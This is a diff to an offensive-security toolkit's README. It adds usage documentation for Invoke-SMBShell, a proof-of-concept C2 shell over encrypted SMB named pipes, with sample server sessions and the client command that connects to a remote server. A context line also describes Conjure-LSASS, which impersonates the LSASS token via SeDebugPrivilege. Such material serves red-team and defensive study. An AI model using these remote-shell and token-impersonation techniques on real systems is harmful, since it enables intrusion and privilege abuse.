@@ -117,6 +117,66 @@ LUID Privilege
 
 ## pwnd
 
+### Invoke-SMBShell
+
+POC shell using named pipes (System.IO.Pipes) as a C2 channel. The SMB traffic is encrypted using AES CBC (code from Empire), the key/pipe are generated randomly by the server on start-up.
+
+**Server:**
+```
+PS C:\> Invoke-SMBShell
+
++-------
+| Host Name: 0AK
+| Named Pipe: tapsrv.5604.yk0DxXvjUD9xwyJ9
+| AES Key: q6EKfuJTX93YUnmX
++-------
+
+[>] Waiting for client..
+
+
+SMB shell: whoami
+0ak\b33f
+
+SMB shell: IdontExist
+The term 'IdontExist' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+
+SMB shell: $PSVersionTable
+Name                           Value
+----                           -----
+PSRemotingProtocolVersion      2.2
+BuildVersion                   6.2.9200.17065
+PSCompatibleVersions           {1.0, 2.0, 3.0}
+PSVersion                      3.0
+CLRVersion                     4.0.30319.42000
+WSManStackVersion              3.0
+SerializationVersion           1.1.0.1
+
+SMB shell: leave
+
+[!] Client disconnecting..
+
+[>] Waiting for client..
+
+
+SMB shell: calc
+Job SMBJob-dVkIkAkXINjMe09S completed successfully!
+
+SMB shell: exit
+
+[!] Client disconnecting..
+[!] Terminating server..
+
+PS C:\>
+```
+
+**Client**
+```
+# Client disconnected because of "leave" command
+PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
+# Client disconnected because "exit" command kills client/server
+PS C:\> Invoke-SMBShell -Client -Server 0AK -AESKey q6EKfuJTX93YUnmX -Pipe tapsrv.5604.yk0DxXvjUD9xwyJ9
+```
+
 ### Conjure-LSASS
 
 Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.
